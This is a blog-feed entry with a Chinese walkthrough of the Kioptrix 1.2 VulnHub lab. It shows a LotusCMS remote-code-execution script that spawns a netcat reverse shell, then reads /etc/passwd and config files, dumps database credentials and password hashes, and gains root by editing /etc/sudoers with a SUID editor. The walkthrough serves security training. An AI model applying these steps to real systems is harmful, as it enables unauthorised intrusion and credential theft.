<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Kioptrix1.2靶机</title>
    <link href="/2023/05/1171bf75474d.html"/>
    <url>/2023/05/1171bf75474d.html</url>
    
    <content type="html"><![CDATA[<p>这台靶机主要涉及信息收集能力，漏洞利用 getshell 较为简单，提权也并不复杂，最花时间的是从最低权限的 shell 中收集有效信息的过程，其中有些是有效信息有些是无效信息，需要仔细鉴别，防止陷入兔子洞。</p><h1 id="Kioptrix1-2靶机"><a href="#Kioptrix1-2靶机" class="headerlink" title="Kioptrix1.2靶机"></a>Kioptrix1.2靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/pic/b3da79520ae9ff6de6695923aa6dcf23_MD5.png" alt="image.png"></p><p><img src="/pic/4e9ce50884fb44ac035464d0f4d34982_MD5.png" alt="image.png"></p><h2 id="web查看"><a href="#web查看" class="headerlink" title="web查看"></a>web查看</h2><p>这里先按照vulhub上界面的提示，在hosts文件中加入了相应域名和ip的对应<br><img src="/pic/d1fa79d0ba30328788178518b55aafa4_MD5.png" alt="image.png"><br>查看主页面<br><img src="/pic/cf5b86be25aaf5b3fcce85198fb3d76d_MD5.png" alt="image.png"><br>这个界面中有三处可以跳转的地方，分别对应了blog、login和gallery<br><img src="/pic/772c6cc93937c1da1f82cfa6e30f6767_MD5.png" alt="image.png"><br><img src="/pic/ee81adf03081302459d0556f183bb7f0_MD5.png" alt="image.png"><br>这里得到了cms的名字LotusCMS<br><img src="/pic/5b1d5be81d07e1cfc65a7071c31ef53c_MD5.png" alt="image.png"><br>最有价值的信息就是cms的名字和登录界面<br>搜索一下这个cms的漏洞<br><img src="/pic/bf3eff94044b1731be09aaa7ea8a4d11_MD5.png" alt="image.png"><br>第一个脚本是通过msf利用的，试一下<br><img src="/pic/d5418d317d6c37762ee28c7d52951a4a_MD5.png" alt="image.png"><br>失败了，去谷歌吧<br><img src="/pic/3d46125818ee5890708186bcff5628ca_MD5.png" alt="image.png"><br>确实是有这个cms的利用方式的，而且根据靶机的时间判断，应该对应这个漏洞<br><img src="/pic/90dff3701f24f0c24f8478494eeb2107_MD5.png" alt="image.png"><br>给了两个文件还有对应的demo视频<br>那就把sh文件下载下来，然后运行试试，这里只列出文件开头给出的使用方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh target lotusCMS-path</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh ki0ptrix3.com /</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Enter IP and PORT when asked to spawn netcat based reverse shell ;)</span><br></code></pre></td></tr></table></figure><p><img src="/pic/0e80c0cf7586e1e96be9943229b616fc_MD5.png" alt="image.png"><br>刚开始尝试直接输入<code>NetCat /dev/tcp</code>但是始终没有反应，看了视频才发现，这里原来是输序号的……<br>反弹shell成功</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443            <br>[sudo] password for kali: <br>listening on [any] 443 ...<br>connect to [192.168.25.128] from (UNKNOWN) [192.168.25.130] 36437<br>whoami<br>www-data<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>来一波信息收集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l<br>sudo -l<br>[sudo] password for www-data: <br><br>www-data@Kioptrix3:/home/www/kioptrix3.com$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    link/ether 00:0c:29:82:a5:78 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.25.130/24 brd 192.168.25.255 scope global eth1<br>    inet6 fe80::20c:29ff:fe82:a578/64 scope link <br>       valid_lft forever preferred_lft forever<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/passwd<br>cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/bin/sh<br>man:x:6:12:man:/var/cache/man:/bin/sh<br>lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>mail:x:8:8:mail:/var/mail:/bin/sh<br>news:x:9:9:news:/var/spool/news:/bin/sh<br>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:13:13:proxy:/bin:/bin/sh<br>www-data:x:33:33:www-data:/var/www:/bin/sh<br>backup:x:34:34:backup:/var/backups:/bin/sh<br>list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>dhcp:x:101:102::/nonexistent:/bin/false<br>syslog:x:102:103::/home/syslog:/bin/false<br>klog:x:103:104::/home/klog:/bin/false<br>mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false<br>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin<br>loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash<br>dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ id<br>id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ uname -a<br>uname -a<br>Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l<br>sudo -l<br>[sudo] password for www-data: <br><br>www-data@Kioptrix3:/home/www/kioptrix3.com$<br></code></pre></td></tr></table></figure><p>有个特殊的文件 ht</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br>&lt;w/kioptrix3.com$ find / -type f -perm -04000 -ls 2&gt;/dev/null                <br> 66011    8 -rwsr-xr-x   1 root     root         4588 Aug 22  2008 /usr/lib/eject/dmcrypt-get-device<br> 90114  172 -rwsr-xr-x   1 root     root       168340 May 14  2008 /usr/lib/openssh/ssh-keysign<br> 90491   12 -rwsr-xr--   1 root     www-data    10276 Jun 18  2009 /usr/lib/apache2/suexec<br> 54187   12 -rwsr-xr-x   1 root     root         9624 Jan 11  2011 /usr/lib/pt_chown<br> 53422   12 -rwsr-xr-x   1 root     root        11048 Dec 10  2007 /usr/bin/arping<br> 53651   48 -rwsr-xr-x   1 root     root        46084 Mar 31  2008 /usr/bin/mtr<br> 50857   20 -rwsr-xr-x   1 root     root        19144 Dec  8  2008 /usr/bin/newgrp<br> 51026   28 -rwsr-xr-x   1 root     root        28624 Dec  8  2008 /usr/bin/chfn<br> 51029   40 -rwsr-xr-x   1 root     root        37360 Dec  8  2008 /usr/bin/gpasswd<br> 52498  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudo<br> 53212   40 -rwsr-sr-x   1 daemon   daemon      38464 Feb 20  2007 /usr/bin/at<br> 52498  112 -rwsr-xr-x   2 root     root       107936 Feb 16  2009 /usr/bin/sudoedit<br> 51027   24 -rwsr-xr-x   1 root     root        23952 Dec  8  2008 /usr/bin/chsh<br> 51030   32 -rwsr-xr-x   1 root     root        29104 Dec  8  2008 /usr/bin/passwd<br> 53424   16 -rwsr-xr-x   1 root     root        12296 Dec 10  2007 /usr/bin/traceroute6.iputils<br> 58472 2028 -rwsr-sr-x   1 root     root      2072344 Apr 16  2011 /usr/local/bin/ht<br> 53710  268 -rwsr-xr--   1 root     dip        269256 Oct  4  2007 /usr/sbin/pppd<br> 52260   16 -rwsr-sr-x   1 libuuid  libuuid     12336 Mar 27  2008 /usr/sbin/uuidd<br>582147    4 -rwsr-xr--   1 root     dhcp         2960 Apr  2  2008 /lib/dhcp3-client/call-dhclient-script<br>196704   20 -rwsr-xr--   1 root     fuse        20056 Feb 26  2008 /bin/fusermount<br>196667   32 -rwsr-xr-x   1 root     root        30856 Dec 10  2007 /bin/ping<br>196644   84 -rwsr-xr-x   1 root     root        81368 Sep 26  2008 /bin/mount<br>196645   68 -rwsr-xr-x   1 root     root        63584 Sep 26  2008 /bin/umount<br>196668   28 -rwsr-xr-x   1 root     root        26684 Dec 10  2007 /bin/ping6<br>196641   28 -rwsr-xr-x   1 root     root        25540 Dec  8  2008 /bin/su<br></code></pre></td></tr></table></figure><p>找了一圈没发现ht的suid的利用方法，接着信息收集吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /etc/crontab<br>cat /etc/crontab<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">m h dom mon dow user  <span class="hljs-built_in">command</span></span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-meta prompt_">#</span><br></code></pre></td></tr></table></figure><p>定时任务里没收获，四处走走看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data$ ls -liah<br>ls -liah<br>total 36K<br>631216 drwxrwxrwx  8 root root 4.0K Apr 14  2011 .<br>630792 drwxr-xr-x  8 root root 4.0K Apr 15  2011 ..<br>631217 -rwxrwxrwx  1 root root   13 Apr  1  2006 .htaccess<br>631218 drwxrwxrwx  3 root root 4.0K Apr 14  2011 config<br>631229 drwxrwxrwx  2 root root 4.0K Apr 14  2011 filebackups<br>631231 drwxrwxrwx  2 root root 4.0K Apr 14  2011 files<br>631233 -rwxrwxrwx  1 root root    0 Apr 11  2010 index.php<br>631234 drwxrwxrwx 10 root root 4.0K Apr 14  2011 modules<br>631266 drwxrwxrwx  2 root root 4.0K Apr 14  2011 pages<br>631269 drwxrwxrwx  2 root root 4.0K Apr 14  2011 users<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data$ cd config<br>cd config<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ ls -liah<br>ls -liah<br>total 36K<br>631218 drwxrwxrwx 3 root root 4.0K Apr 14  2011 .<br>631216 drwxrwxrwx 8 root root 4.0K Apr 14  2011 ..<br>631219 -rwxrwxrwx 1 root root    4 Oct  2  2010 active_design.dat<br>631220 -rwxrwxrwx 1 root root    0 Apr 11  2010 index.php<br>631221 drwxrwxrwx 2 root root 4.0K Apr 14  2011 modules<br>631224 -rwxrwxrwx 1 root root   30 Apr 14  2011 salt.dat<br>631225 -rwxrwxrwx 1 root root   21 Oct  2  2010 site_description.dat<br>631226 -rwxrwxrwx 1 root root    8 Oct  2  2010 site_keywords.dat<br>631227 -rwxrwxrwx 1 root root   15 Apr 14  2011 site_title.dat<br>631228 -rwxrwxrwx 1 root root    5 Mar 14  2011 site_version.dat<br></code></pre></td></tr></table></figure><p>有一些有意思的文件，挨个看看吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ ls<br>ls<br>active_design.dat  modules   site_description.dat  site_title.dat<br>index.php          salt.dat  site_keywords.dat     site_version.dat<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat salt.dat<br>cat salt.dat<br>gtZBO2PewhZHR10hGXLaSt0Bc5Ub73<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_description.dat<br>&lt;w/kioptrix3.com/data/config$ cat site_description.dat                       <br>Your Site Description<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_keywords.dat<br>cat site_keywords.dat<br>LotusCMS<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat index.php<br>cat index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat active_design.dat<br>cat active_design.dat<br>grey<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/config$ cat site_version.dat<br>cat site_version.dat<br>3.0.5<br></code></pre></td></tr></table></figure><p>一是确定了LotusCMS的版本（都已经打进来了，版本号也没什么用了），二是拿到了salt，或许之后用得到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com/data$ cd users<br>cd users<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ ls -liah<br>ls -liah<br>total 12K<br>631269 drwxrwxrwx 2 root     root     4.0K Apr 14  2011 .<br>631216 drwxrwxrwx 8 root     root     4.0K Apr 14  2011 ..<br>631270 -rw-r--r-- 1 www-data www-data   67 Apr 15  2011 admin.dat<br>631271 -rwxrwxrwx 1 root     root        0 Apr 11  2010 index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ cat admin.dat<br>cat admin.dat<br>|318d8dd409db395f0317efa71b3bad13e1fb9857|administrator|bla@bla.com<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ cat index.php<br>cat index.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com/data/users$ <br></code></pre></td></tr></table></figure><p>admin.dat里有密码，尝试在线网站破解失败，尝试一下本地破解？<br>接着搜集一下信息吧</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ ls gallery<br>ls gallery<br>BACK         gfooter.php     logout.php        readme.html    tags.php<br>db.sql       gfunctions.php  p.php             recent.php     themes<br>g.php        gheader.php     photos            register.php   version.txt<br>gadmin       index.php       photos.php        scopbin        vote.php<br>gallery.php  install.BAK     post_comment.php  search.php<br>gconfig.php  login.php       profile.php       slideshow.php<br>www-data@Kioptrix3:/home/www/kioptrix3.com$ cat ./gallery/gconfig.php<br>cat ./gallery/gconfig.php<br>&lt;?php<br>        error_reporting(0);<br>        /*<br>                A sample Gallarific configuration file. You should edit<br>                the installer details below and save this file as gconfig.php<br>                Do not modify anything else if you don&#x27;t know what it is.<br>        */<br><br>        // Installer Details -----------------------------------------------<br><br>        // Enter the full HTTP path to your Gallarific folder below,<br>        // such as http://www.yoursite.com/gallery<br>        // Do NOT include a trailing forward slash<br><br>        $GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;<br><br>        $GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;<br>        $GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;<br><br>        // Setting Details -------------------------------------------------<br><br>if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;<br>                echo(&quot;A connection to the database couldn&#x27;t be established: &quot; . mysql_error());<br>                die();<br>&#125;else &#123;<br>        if(!$g_mysql_d = @mysql_select_db($GLOBALS[&quot;gallarific_mysql_database&quot;], $g_mysql_c)) &#123;<br>                echo(&quot;The Gallarific database couldn&#x27;t be opened: &quot; . mysql_error());<br>                die();<br>        &#125;else &#123;<br>                $settings=mysql_query(&quot;select * from gallarific_settings&quot;);<br>                if(mysql_num_rows($settings)!=0)&#123;<br>                        while($data=mysql_fetch_array($settings))&#123;<br>                                $GLOBALS[&quot;&#123;$data[&#x27;settings_name&#x27;]&#125;&quot;]=$data[&#x27;settings_value&#x27;];<br>                        &#125;<br>                &#125;<br><br>        &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>拿到了数据库的用户名和密码，登录mysql数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Kioptrix3:/home/www/kioptrix3.com$ mysql -u root -p<br>mysql -u root -p<br>Enter password: fuckeyou<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 10<br>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the buffer.<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show database;</span><br>show database;<br>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;database&#x27; at line 1<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema | <br>| gallery            | <br>| mysql              | <br>+--------------------+<br>3 rows in set (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">use gallery</span><br>use gallery<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br>show tables;<br>+----------------------+<br>| Tables_in_gallery    |<br>+----------------------+<br>| dev_accounts         | <br>| gallarific_comments  | <br>| gallarific_galleries | <br>| gallarific_photos    | <br>| gallarific_settings  | <br>| gallarific_stats     | <br>| gallarific_users     | <br>+----------------------+<br>7 rows in set (0.00 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from gallarific_users</span><br>select * from gallarific_users<br>    -&gt; ;<br>;<br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>| userid | username | password | usertype  | firstname | lastname | email | datejoined | website | issuperuser | photo | joincode |<br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>|      1 | admin    | n0t7t1k4 | superuser | Super     | User     |       | 1302628616 |         |           1 |       |          | <br>+--------+----------+----------+-----------+-----------+----------+-------+------------+---------+-------------+-------+----------+<br>1 row in set (0.01 sec)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from dev_accounts</span><br>select * from dev_accounts<br>    -&gt; ;<br>;<br>+----+------------+----------------------------------+<br>| id | username   | password                         |<br>+----+------------+----------------------------------+<br>|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | <br>|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | <br>+----+------------+----------------------------------+<br>2 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><p>发现了许多东西啊……，admin尝试登录后台失败，下面两个用户登录也失败，尝试一下登录ssh，admin失败，loneferret成功<br><img src="/pic/935cd37da07c7bb5d1552029814721dc_MD5.png" alt="image.png"><br>登录也成功</p><h3 id="ht软件编辑器提权"><a href="#ht软件编辑器提权" class="headerlink" title="ht软件编辑器提权"></a>ht软件编辑器提权</h3><p>查看当前用户权限，发现ht具有root权限。而且提示我们ht是一个软件编辑器。<br><img src="/pic/6b771d75ba14de2d6b773bf8c24bbee9_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install terminal.app  <span class="hljs-comment"># 这里我是安装terminal.app利用的</span><br> <br>terminal  <span class="hljs-comment"># 运行</span><br> <br>出现蓝色界面，按F3，然后输入/etc/sudoers，回车<br></code></pre></td></tr></table></figure><p><img src="/pic/2c5bf1a78c429071308d154963ba5294_MD5.png"><br>添加如下图内容，然后按F2保存，Ctrl+c退出即可。<br><img src="/pic/a2722597f306cadc9d82853b5cec799c_MD5.png"><br>重新查看用户权限，发现已经成功添加，sudo执行即可获取root权限。<br><img src="/pic/48a30c7cc9392cf98cd5c623dd35b833_MD5.png"></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Billu_b0x靶机</title>
    <link href="/2023/05/e1d55a03f737.html"/>
    <url>/2023/05/e1d55a03f737.html</url>
    
